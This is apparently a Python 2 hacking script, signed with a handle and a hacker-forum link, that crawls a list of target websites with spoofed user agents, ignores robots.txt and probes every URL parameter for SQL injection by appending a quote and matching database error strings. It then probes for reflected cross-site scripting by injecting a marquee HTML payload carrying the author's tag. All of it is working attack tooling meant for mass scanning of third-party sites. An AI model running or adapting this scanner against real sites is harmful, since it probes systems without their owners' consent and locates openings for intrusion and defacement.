#!/usr/bin/python
#-*- coding: cp1254 -*-

import re, urllib,urllib2, time, httplib, socket, sys, md5, locale
from urllib2 import Request, urlopen, URLError, HTTPError
from socket import *
import threading
from bs4 import BeautifulSoup
import urlparse            
import mechanize
import webbrowser
import os
import random
import multiprocessing




print """                                                            
                                        ####                      #######
                                     ##########                 #########
                                  #################            ######### 
& facebook/b3mb4m              ########################      #########   
                            ############################    #       #            
& cyber-warrior.org/187971 ############################### #      ##    
                           ###############################      ##
& b3mb4m@gmail.com        ###############################     ##
                          ##############################    ##
                                         #     ########    #
                             ##      ###          ####   ##
                                                  ###   ###
                                                ####   ###
                           ####          ##########   ####
                           #######################   ####
                             ####################   ####
                              ##################  ####
                                ############      ##
                                   ########        ###
                                  #########        #####
                                ############      ######
                               ########      #########
                                 #####       ########
                                   ###       #########
                                  ######    ############
                                 #######################                   
                                 #   #   ###  #   #   ##                 
                                 ########################                
                                  ##     ##   ##     ##

& http://www.youtube.com/channel/UCvt2HkV2jtIOESI7IvseSjg
 
            """
def sqlxss():
    #name = multiprocessing.current_process().name
    
    #print ""
    #print "First one "+time.strftime("%H:%M:%S")
    #print ""
    
    doc = open("b3mb4mdata.txt", "r")#Log doc 
    B3mB4mdata = doc.readlines()

    print """


    SQL Test Active ..


    """

    #Agents
    useragent = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
                    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
                    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
                    'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
                    'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
                    'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
                    'Microsoft Internet Explorer/4.0b1 (Windows 95)',
                    'Opera/8.00 (Windows NT 5.1; U; en)',
                    'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
                    'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
                        'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
                    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
                    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
                    'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]']
        
    agents = random.choice(useragent)
        
       


    for i in B3mB4mdata: 
        i = i.replace("\n", "") #Raise
        print ""
        print "TARGET -->  "+i
        print ""

        xxx = i.replace("http://", "")
        docname = xxx+".txt"
        logs = open(docname, "w")
        

        
        url = i
        tarayici = mechanize.Browser()
        tarayici.set_handle_robots(False)
        tarayici.addheaders = [('User-agent', agents)]
        urls = [url]
        gez = [url]
        
        while len(urls)>0:
                            
            try:
                tarayici.open(urls[0])
                urls.pop(0)
                                                    
                try:
                    #raise NameError('BrowserStateError')
                
                    for link in tarayici.links():
                        yeniurl =  urlparse.urljoin(link.base_url,link.url)
                        if yeniurl not in gez and url in yeniurl:
                            gez.append(yeniurl)
                            urls.append(yeniurl)
                            print "Searching value -->"+yeniurl
                            
                            if "=" in yeniurl:
                                yeniurl = yeniurl+"'"
                                
                                try:
                                   req  = urllib2.Request(yeniurl)
                                   fd   = urllib2.urlopen(req)
                                   data = fd.read()
                                   if "Query failed" in data:
                                       print "\nSQL FOUND! \n-->  "+yeniurl
                                       print ""
                                       logs.write("\n SQL FOUND --> \n"+yeniurl)
                                       logs.close()
                                       urls = 0 
                                   elif "supplied argument is not a valid MySQL result resource in" in data:
                                       print  "\nSQL FOUND! \n-->  "+yeniurl
                                       print ""
                                       logs.write("\n SQL FOUND --> \n"+yeniurl)
                                       logs.close()
                                       urls = 0
                                   elif "You have an error in your SQL syntax" in data:
                                       print "\nSQL FOUND! \n-->  "+yeniurl
                                       print ""
                                       logs.write("\n SQL FOUND --> \n"+yeniurl)
                                       logs.close()
                                       urls = 0
                                   elif "ORDER BY" in data:
                                       print "\nSQL FOUND! \n-->  "+yeniurl
                                       print ""
                                       logs.write("\n SQL FOUND --> \n"+yeniurl)
                                       logs.close()
                                       urls = 0
                                   elif "mysql_num_rows()" in data:
                                       print "\nSQL FOUND! \n-->  "+yeniurl
                                       print ""
                                       logs.write("\n SQL FOUND --> \n"+yeniurl)
                                       logs.close()
                                       urls = 0
                                   elif "SQL query failed" in data:
                                       print "\nSQL FOUND! \n-->  "+yeniurl
                                       print ""
                                       logs.write("\n SQL FOUND --> \n"+yeniurl)
                                       logs.close()
                                       urls = 0
                                   elif "Microsoft JET Database Engine error '80040e14'" in data:
                                       print "\nSQL FOUND! \n-->  "+yeniurl
                                       print ""
                                       logs.write("\n SQL FOUND --> \n"+yeniurl)
                                       logs.close()
                                       urls = 0
                                   elif "Microsoft OLE DB Provider for Oracle" in data:
                                       print "\nSQL FOUND! \n-->  "+yeniurl
                                       print ""
                                       logs.write("\n SQL FOUND --> \n"+yeniurl)
                                       logs.close()
                                       urls = 0
                                   elif "Error:unknown" in data:
                                       print "\nSQL FOUND! \n-->  "+yeniurl
                                       print ""
                                       logs.write("\n SQL FOUND --> \n"+yeniurl)
                                       logs.close()
                                       urls = 0
                                   elif "Fatal error" in data:
                                       print "\nSQL FOUND! \n-->  "+yeniurl
                                       print ""
                                       logs.write("\n SQL FOUND --> \n"+yeniurl)
                                       logs.close()
                                       urls = 0
                                   elif "mysql_fetch" in data:
                                       print "\nSQL FOUND! \n-->  "+yeniurl
                                       print ""
                                       logs.write("\n SQL FOUND --> \n"+yeniurl)
                                       logs.close()
                                       urls = 0
                                   elif "Syntax error" in data:
                                       print "\nSQL FOUND! \n-->  "+yeniurl
                                       print ""
                                       logs.write("\n SQL FOUND --> \n"+yeniurl)
                                       logs.close()
                                       urls = 0
                                   elif "error in your SQL syntax" in data:
                                       print "\nSQL FOUND!\n-->  "+yeniurl
                                       print ""
                                       logs.write("\n SQL FOUND --> \n"+yeniurl)
                                       logs.close()
                                       urls = 0
         
                                       
                                except urllib2.HTTPError:
                                    pass
                                except ValueError:
                                    pass
                                except URLError, e:
                                    pass
                                except IndexError:
                                    pass
                                except NameError:
                                    pass
                                    #raise
                                

                                
                            else:
                               continue

                                                    
                #except TypeError:
                    #pass
                #except NameError:
                    #pass
                #except AttributeError: # İts magic code yay :3 !
                    #break
                except:
                    break


            #except TypeError:
                #pass #Work pls ...
            #except urllib2.HTTPError:
                #pass
            #except ValueError:
                #pass
            #except URLError, e:
                #pass
            #except IndexError:
                #pass
            except:
                #print "Error link "
                urls.pop(0)
                
                

def xss():
    
    doc = open("b3mb4mdata.txt", "r")#Log doc 
    B3mB4mdata = doc.readlines()

    for i in B3mB4mdata:
        i = i.replace("\n", "") #Raise2
        print ""
        print "TARGET -->  "+i
        print ""

        xx = i.replace("http://", "")
        docname2 = xx+".xss"+".txt"
        logsxss = open(docname2, "w")
            
        url = i
        tarayici = mechanize.Browser()
        urls = [url]
        gez = [url]

        while len(urls)>0:
            try:             
                tarayici.open(urls[0])
                urls.pop(0)
                try:
                    for link in tarayici.links():
                        yeniurl =  urlparse.urljoin(link.base_url,link.url)
                        if yeniurl not in gez and url in yeniurl:
                            gez.append(yeniurl)
                            urls.append(yeniurl)
                            #print yeniurl
                            
                            if "=" in yeniurl:
                                #print yeniurl
                                try:    
                                    #print yeniurl
                                    purelink = yeniurl.split("=")
                                    xss = purelink[0]+"""='">><marquee><h1>B3mB4m</h1></marquee>"""
                                    uagent= {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)'}
                                    req = urllib2.Request(xss, headers=uagent)
                                    fd = urllib2.urlopen(xss)
                                    data= fd.read()
                                    if "B3mB4m" in data:
                                        print "XSS FOUND! \n-->  "+xss
                                        logsxss.write("\n\n XSS FOUND --> \n"+xss)
                                        logsxss.close()
                                        urls = 0
                                except:
                                    pass
                            else:
                               pass
                            
                #except TypeError:
                    #pass
                #except NameError:
                    #pass
                #except AttributeError: # MAGİC CODE ı just spend 10h lol.
                    #break
                except:
                    break

                                        
            except:
                urls.pop(0)
            
                                                 
                                    
                                                                        
sqlxss()                                                                   
xss()                                                  
                                         
